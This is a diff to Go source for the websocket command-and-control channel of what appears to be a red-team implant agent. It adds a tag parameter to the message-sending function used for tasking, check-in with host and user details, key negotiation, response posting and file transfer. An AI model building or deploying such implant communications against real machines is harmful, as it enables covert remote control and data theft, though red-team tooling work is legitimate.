@@ -160,7 +160,7 @@ func (c *C2Websockets) SetRsaKey(newKey *rsa.PrivateKey) {
 }
 
 func (c *C2Websockets) GetTasking() interface{} {
-	rawTask := c.sendData(TaskMsg, ApfellIDType, c.ApfID(), []byte(""))
+	rawTask := c.sendData(TaskMsg, ApfellIDType, c.ApfID(), "", []byte(""))
 	task := structs.Task{}
 	err := json.Unmarshal(rawTask, &task)
 
@@ -175,7 +175,7 @@ func (c *C2Websockets) PostResponse(task structs.Task, output string) []byte {
 	taskResp := structs.TaskResponse{}
 	taskResp.Response = base64.StdEncoding.EncodeToString([]byte(output))
 	dataToSend, _ := json.Marshal(taskResp)
-	return c.sendData(ResponseMsg, TASKIDType, task.ID, dataToSend)
+	return c.sendData(ResponseMsg, TASKIDType, task.ID, "", dataToSend)
 }
 
 func (c *C2Websockets) SendFile(task structs.Task, params string) {
@@ -202,7 +202,7 @@ func (c *C2Websockets) SendFile(task structs.Task, params string) {
 }
 
 func (c *C2Websockets) GetFile(fileid string) []byte {
-	fileData := c.sendData(FileMsg, FileIDType, fileid, []byte(""))
+	fileData := c.sendData(FileMsg, FileIDType, fileid, c.ApfID(), []byte(""))
 
 	return fileData
 }
@@ -303,13 +303,13 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) int
 		}
 
 		//log.Println("Exchanging keys: ", c.XKeys())
-		resp = c.sendData(EKE, SESSIDType, sID, checkinMsg)
+		resp = c.sendData(EKE, SESSIDType, sID, "", checkinMsg)
 	} else if len(c.AesPreSharedKey()) != 0 {
 		//log.Println("Sending AES PSK checkin")
-		resp = c.sendData(AES, UUIDType, c.UUID, checkinMsg)
+		resp = c.sendData(AES, UUIDType, c.UUID, "", checkinMsg)
 	} else {
 		//log.Println("Sending unencrypted checkin")
-		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, checkinMsg)
+		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, "", checkinMsg)
 	}
 
 	//log.Printf("Raw response: %s ", string(resp))
@@ -340,7 +340,7 @@ func (c *C2Websockets) NegotiateKey() string {
 		return ""
 	}
 
-	res := c.sendData(EKE, UUIDType, UUID, unencryptedMsg)
+	res := c.sendData(EKE, UUIDType, UUID, "", unencryptedMsg)
 	// base64 decode the response and then decrypt it
 	rawResp, err := base64.StdEncoding.DecodeString(string(res))
 	if err != nil {
@@ -381,7 +381,7 @@ func (c *C2Websockets) getData() []byte {
 	return decData
 }
 
-func (c *C2Websockets) sendData(msgType int, idType int, id string, data []byte) []byte {
+func (c *C2Websockets) sendData(msgType int, idType int, id string, tag string, data []byte) []byte {
 	m := structs.Message{}
 
 	if len(c.AesPreSharedKey()) != 0 {
